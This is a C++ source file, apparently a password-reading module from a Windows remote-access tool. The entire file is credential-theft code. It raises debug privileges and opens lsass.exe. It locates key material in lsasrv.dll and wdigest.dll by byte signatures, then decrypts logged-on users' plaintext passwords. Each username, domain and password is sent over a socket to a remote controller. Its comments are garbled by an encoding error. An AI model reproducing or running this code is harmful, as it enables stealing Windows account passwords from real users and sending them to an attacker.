#include "StdAfx.h"
#include "ReadPsw.h"

CReadPsw::CReadPsw(void)
{
}

CReadPsw::~CReadPsw(void)
{
}

void CReadPsw::SendSecurityPwd( IN SOCKET sock )
{
	HINSTANCE hModlsasrv ;
	DWORD     LogonSessionCount, i ,dwBytesRead ;
	PLUID     LogonSessionList, pCurLUID , pListLUID ;
	BYTE      EncryptBuf[0x200] ;
	HANDLE    hProcess ;


	if(EnableDebugPrivilege() != 1)
		puts("EnableDebugPrivilege fail !") ;

	hProcess = GetProcessHandleByName(_T("lsass.exe")) ;
	if(hProcess == NULL)
	{
// 		puts("GetProcessHandleByName fail !") ;
// 		puts("Try To Run As Administrator ...") ;
		return ;
	}

	OSVERSIONINFO VersionInformation ;
	DWORD dwVerOff = 0 , osKind = -1 ;

	// �汾�ж�
	memset(&VersionInformation, 0, sizeof(VersionInformation));
	VersionInformation.dwOSVersionInfoSize = sizeof(VersionInformation) ;
	GetVersionEx(&VersionInformation) ;
	if (VersionInformation.dwMajorVersion == 5)
	{
		if ( VersionInformation.dwMinorVersion == 1 )
		{
			dwVerOff = 36 ;
			osKind = WINXP ;
		}
		else if (VersionInformation.dwMinorVersion == 2)
		{
			dwVerOff = 28 ;
			osKind = WIN03 ;
		}
	}
	else if (VersionInformation.dwMajorVersion == 6)
	{
		dwVerOff = 32 ;
		osKind = WIN7 ;
	} 

	if(osKind == -1)
	{
		printf("[Undefined OS version]  Major: %d Minor: %d\n", \
			VersionInformation.dwMajorVersion, VersionInformation.dwMinorVersion) ;
		CloseHandle(hProcess) ;
		return ;
	}

	// ��ý��ܺ�����ַ
	pDECRIPTFUNC  DecryptFunc ;
	hModlsasrv  = LoadLibrary(_T("lsasrv.dll")) ;
	DecryptFunc = (pDECRIPTFUNC)search_bytes((PBYTE)hModlsasrv, (PBYTE)0x7fffdddd, DecryptfuncSign, sizeof(DecryptfuncSign)) ;

	// �����������ͷ��ַ
	LPVOID  ListHead ;
	ListHead = GetEncryptListHead() ;                 

	// ���ȫ������(lsasrv.data������KEY��ص�����)
	CopyKeyGlobalData(hProcess, hModlsasrv, osKind) ;  

	HINSTANCE                   hModSecur32 ;
	pLSAENUMERATELOGONSESSIONS  LsaEnumerateLogonSessions ;
	pLSAGETLOGONSESSIONDATA     LsaGetLogonSessionData ; 
	pLSAFREERETURNBUFFER        LsaFreeReturnBuffer ;

	hModSecur32               = LoadLibrary(_T("Secur32.dll")) ;
	LsaEnumerateLogonSessions = (pLSAENUMERATELOGONSESSIONS)GetProcAddress(hModSecur32, "LsaEnumerateLogonSessions") ;
	LsaGetLogonSessionData    = (pLSAGETLOGONSESSIONDATA)GetProcAddress(hModSecur32, "LsaGetLogonSessionData") ;
	LsaFreeReturnBuffer       = (pLSAFREERETURNBUFFER)GetProcAddress(hModSecur32, "LsaFreeReturnBuffer") ;

	LsaEnumerateLogonSessions(&LogonSessionCount, &LogonSessionList) ;
    MSGINFO_S tagMsgInfo;
	READPSWDATA_S tagRPWDATA;
    bool bSuccess = true;

	for(i = 0 ; i < LogonSessionCount ; i++)  //ѭ��������ǰ�ʺ���Ϣ
	{
		memset(&tagMsgInfo, 0, sizeof(MSGINFO_S)); //��ʼ���ṹ����Ϣ
		memset(&tagRPWDATA, 0, sizeof(READPSWDATA_S));
        tagMsgInfo.Msg_id = CMD_GETPWD;

		pCurLUID = (PLUID)((DWORD)LogonSessionList + sizeof(LUID) * i) ;
		// ��ӡ�����Ϣ
		printSessionInfo(LsaGetLogonSessionData, LsaFreeReturnBuffer, pCurLUID, &tagRPWDATA) ;  //��ȡ��¼���͵�¼��
		// ������ʽ�ṹ���ҵ�ǰ��LUID
		ReadProcessMemory(hProcess,  ListHead, EncryptBuf, 0x100, &dwBytesRead) ;
		while(*(DWORD *)EncryptBuf != (DWORD)ListHead)
		{
			ReadProcessMemory(hProcess, (LPVOID)(*(DWORD *)EncryptBuf), EncryptBuf, 0x100, &dwBytesRead) ;
			pListLUID = (LUID *)((DWORD)EncryptBuf + 0x10) ;
			if((pListLUID->LowPart  ==  pCurLUID->LowPart) && (pListLUID->HighPart == pCurLUID->HighPart)) 
			{ 
				break ;
			}
		}
		if(*(DWORD *)EncryptBuf == (DWORD)ListHead)
		{
			puts("Specific LUID NOT found\n") ;
			wchar_t szErrorMsg[] = _T("Specific LUID NOT found");
			wsprintfW(tagRPWDATA.szErrorMsg, szErrorMsg);   //������Ϣ
		}
		else
		{
			DWORD   pFinal = 0 ;
			DWORD   nBytes = 0 ;
			LPVOID  pEncrypt   ;
			pFinal   = (DWORD)(pListLUID) + dwVerOff  ;
			nBytes   = *(WORD *)((DWORD)pFinal + 2) ;            // ���Ĵ�С
			pEncrypt = (LPVOID)(*(DWORD *)((DWORD)pFinal + 4)) ; // ���ĵ�ַ(Remote)

			memset(Encryptdata, 0, sizeof(Encryptdata)) ;
			ReadProcessMemory(hProcess, (LPVOID)pEncrypt, Encryptdata, nBytes, &dwBytesRead) ;

			// ���ý��ܺ�������
			DecryptFunc(Encryptdata, nBytes) ; 
			// ��ӡ��������
			printf("password: %S\n\n", Encryptdata);
			wsprintfW(tagRPWDATA.szUserPwd , _T("%s"), Encryptdata);
		}
		memcpy((char*)tagMsgInfo.context, (char*)&tagRPWDATA, sizeof(READPSWDATA_S));
		m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}

	CloseHandle(hProcess) ;
	LsaFreeReturnBuffer(LogonSessionList) ;

	FreeLibrary(hModlsasrv) ;
	FreeLibrary(hModSecur32) ;
	if(osKind == WIN7)
	{
		FreeLibrary(GetModuleHandle(_T("bcrypt.dll"))) ;
		FreeLibrary(GetModuleHandle(_T("bcryptprimitives.dll"))) ;
	}
}

void CReadPsw::CopyKeyGlobalData( HANDLE hProcess, LPVOID hModlsasrv, int osKind )
{
	PIMAGE_SECTION_HEADER pSectionHead ;
	PIMAGE_DOS_HEADER     pDosHead ;
	PIMAGE_NT_HEADERS     pPEHead  ;
	DWORD                 dwBytes, dwBytesRead ;
	LPVOID                pdataAddr, pDecryptKey , DecryptKey, pEndAddr ;

	pDosHead     = (PIMAGE_DOS_HEADER)hModlsasrv ;
	pSectionHead = (PIMAGE_SECTION_HEADER)(pDosHead->e_lfanew + (DWORD)hModlsasrv \
		+ sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER)) ;

	pdataAddr = (LPVOID)((DWORD)pSectionHead->VirtualAddress  + (DWORD)hModlsasrv) ;
	dwBytes   = ((DWORD)(pSectionHead->Misc.VirtualSize) / 0x1000 + 1) * 0x1000 ;
	ReadProcessMemory(hProcess, pdataAddr, pdataAddr, dwBytes, &dwBytesRead) ;

	pPEHead   = (PIMAGE_NT_HEADERS)(pDosHead->e_lfanew + (DWORD)hModlsasrv) ;
	pEndAddr  = (LPVOID)(pPEHead->OptionalHeader.SizeOfImage + (DWORD)hModlsasrv) ;

	switch(osKind)
	{
	case WINXP :
	case WIN03 :
		{
			pDecryptKey = (LPVOID)search_bytes((PBYTE)(hModlsasrv), (PBYTE)pEndAddr , \
				DecryptKeySign_XP, sizeof(DecryptKeySign_XP)) ;

			pDecryptKey = (LPVOID)*(DWORD *)((DWORD)pDecryptKey + sizeof(DecryptKeySign_XP)) ;
			ReadProcessMemory(hProcess, (LPVOID)pDecryptKey, &DecryptKey, 4, &dwBytesRead) ;
			// DecryptKey ���������صĹؼ���ַ
			ReadProcessMemory(hProcess, (LPVOID)DecryptKey, MemBuf, 0x200, &dwBytesRead) ;
			pdataAddr  = (LPVOID)pDecryptKey ;
			*(DWORD *)pdataAddr = (DWORD)MemBuf ;

			break ;
		}
	case WIN7 :
		{
			// WIN7 �����������DLL�еĺ������н���
			LoadLibrary(_T("bcrypt.dll")) ;
			LoadLibrary(_T("bcryptprimitives.dll")) ;

			pDecryptKey = (LPVOID)search_bytes((PBYTE)(hModlsasrv), (PBYTE)pEndAddr , \
				DecryptKeySign_WIN7, sizeof(DecryptKeySign_WIN7)) ;
			pDecryptKey = (LPVOID)(*(DWORD *)((DWORD)pDecryptKey - 4)) ;

			// DecryptKey ���������صĹؼ���ַ
			ReadProcessMemory(hProcess,  pDecryptKey, &DecryptKey, 0x4, &dwBytesRead) ;

			ReadProcessMemory(hProcess, (LPVOID)DecryptKey, MemBuf, 0x200, &dwBytesRead) ;
			pdataAddr  = (LPVOID)pDecryptKey ;
			*(DWORD *)pdataAddr = (DWORD)MemBuf ;

			ReadProcessMemory(hProcess, (LPVOID)(*(DWORD *)((DWORD)MemBuf + 8)), SecBuf, 0x200, &dwBytesRead) ;
			pdataAddr  = (LPVOID)((DWORD)MemBuf + 8) ;
			*(DWORD *)pdataAddr = (DWORD)SecBuf ;

			ReadProcessMemory(hProcess, (LPVOID)(*(DWORD *)((DWORD)MemBuf + 0xC)), ThirdBuf, 0x200, &dwBytesRead) ;
			pdataAddr  = (LPVOID)((DWORD)MemBuf + 0xC) ;
			*(DWORD *)pdataAddr = (DWORD)ThirdBuf ;        

			break ;
		}
	}
	return ;
}

CString CReadPsw::CharToCString(IN char* result)
{
	//��char ת��Ϊ CString�ַ�
	DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, result, -1, NULL, 0);
	wchar_t *pwText;
	pwText = new wchar_t[dwNum];
	if (!pwText)
	{
		delete []pwText;
		return NULL;
	}
	MultiByteToWideChar (CP_ACP, 0, result, -1, pwText, dwNum);// ��ʼת��
	CString cstr = pwText;
	delete pwText;
	return cstr;
}

HANDLE CReadPsw::GetProcessHandleByName(const TCHAR *szName)
{
	//
	// GetProcessHandle���lsass.exe���̾��
	//
	DWORD  dwProcessId , ReturnLength, nBytes ;
	WCHAR  Buffer[MAX_PATH + 0x20] ;
	HANDLE hProcess ;
	PWCHAR pRetStr ;
	pNTQUERYPROCESSINFORMATION NtQueryInformationProcess ;
	CHAR   szCurrentPath[MAX_PATH] ;

	NtQueryInformationProcess = (pNTQUERYPROCESSINFORMATION)GetProcAddress(GetModuleHandle(_T("ntdll.dll")) , \
		"NtQueryInformationProcess") ;

	// Process ID һ���� 4 �ı���
	for(dwProcessId = 4 ; dwProcessId < 10*1000 ; dwProcessId += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS , FALSE, dwProcessId) ;
		if(hProcess != NULL)
		{
			if(!NtQueryInformationProcess(hProcess, 27, Buffer, sizeof(Buffer), &ReturnLength))
			{
				pRetStr = (PWCHAR)(*(DWORD *)((DWORD)Buffer + 4)) ;

				nBytes = WideCharToMultiByte(CP_ACP, 0, pRetStr, -1, \
					szCurrentPath, MAX_PATH, NULL, NULL) ;
				if(nBytes)
				{
					PCHAR pCurName = &szCurrentPath[nBytes-1] ;
					while(pCurName >= szCurrentPath)
					{
						if(*pCurName == '\\')  break ;
						pCurName -- ;
					}
					pCurName ++ ;
					CString str = CharToCString(pCurName);
					if(lstrcmpi(szName, str) == 0)
					{
						return hProcess ;
					}
				}
			}
			// �رմ򿪵ľ��
			CloseHandle(hProcess) ;
		}
	}
	return NULL ;
}

LPVOID CReadPsw::GetEncryptListHead()
{
	//
	// ����KeyPointerSign[]������Ĵ洢�Ĺؼ���ص�ַ
	//
	HINSTANCE hMod ;
	LPVOID    pEndAddr, KeyPointer, pTemp ;

	hMod = LoadLibrary(_T("wdigest.dll")) ;
	pEndAddr = GetProcAddress(hMod, "SpInstanceInit") ;
	pTemp = hMod ;
	KeyPointer = NULL ;
	while(pTemp < pEndAddr && pTemp != NULL)
	{
		KeyPointer = pTemp ;
		pTemp = (LPVOID)search_bytes((PBYTE)pTemp + sizeof(KeyPointerSign), (PBYTE)pEndAddr, \
			KeyPointerSign, sizeof(KeyPointerSign)) ;
	}
	KeyPointer = (LPVOID)(*(DWORD *)((DWORD)KeyPointer - 4)) ;
	FreeLibrary(hMod) ;
	return KeyPointer ;
}

void CReadPsw::printSessionInfo(pLSAGETLOGONSESSIONDATA  LsaGetLogonSessionData, 
								pLSAFREERETURNBUFFER LsaFreeReturnBuffer,
								PLUID pCurLUID,
								OUT READPSWDATA_S* tagRPWDATA)
{
	PSECURITY_LOGON_SESSION_DATA pLogonSessionData ;

	LsaGetLogonSessionData(pCurLUID, &pLogonSessionData) ;
	printf("UserName: %S\n", pLogonSessionData->UserName.Buffer) ;   //�û���
	printf("LogonDomain: %S\n", pLogonSessionData->LogonDomain.Buffer) ;  //��½��

	wsprintfW(tagRPWDATA->szUserName, _T("%s"), pLogonSessionData->UserName.Buffer);
	wsprintfW(tagRPWDATA->szDomain, _T("%s"), pLogonSessionData->LogonDomain.Buffer);

	LsaFreeReturnBuffer(pLogonSessionData) ;
}

int CReadPsw::EnableDebugPrivilege()
{
	HANDLE hToken ;
	LUID   sedebugnameValue ;
	TOKEN_PRIVILEGES tkp ;

	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken) )
	{
		puts("OpenProcessToken fail") ;
		return 0 ;
	}
	if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		puts("LookupPrivilegeValue fail") ;
		return 0 ;
	}

	tkp.PrivilegeCount = 1 ;
	tkp.Privileges[0].Luid = sedebugnameValue ;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED ;
	if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL) )
	{
		puts("AdjustTokenPrivileges fail") ;
		return 0 ;
	}
	return 1 ;
}

PBYTE CReadPsw::search_bytes(PBYTE pBegin, PBYTE pEnd, PBYTE pBytes, DWORD nsize)
{
	//
	// ��pBegin��pEnd֮������pBytes��ַ����ָ���ֽ����У��ֽڸ���Ϊnsize
	//
	DWORD count ;
	PBYTE pDst ;

	while((DWORD)pBegin + (DWORD)nsize <= (DWORD)pEnd)
	{
		pDst  = pBytes ;
		count = 0 ;
		while(count < nsize && *pBegin == *pDst)
		{
			pBegin ++ ;
			pDst   ++ ;
			count  ++ ;
		}
		if(count == nsize)  break ;
		pBegin = pBegin - count + 1 ;
	}
	if(count == nsize)
	{
		return (PBYTE)((DWORD)pBegin - (DWORD)count) ;
	}
	else
	{
		return NULL ;
	}
}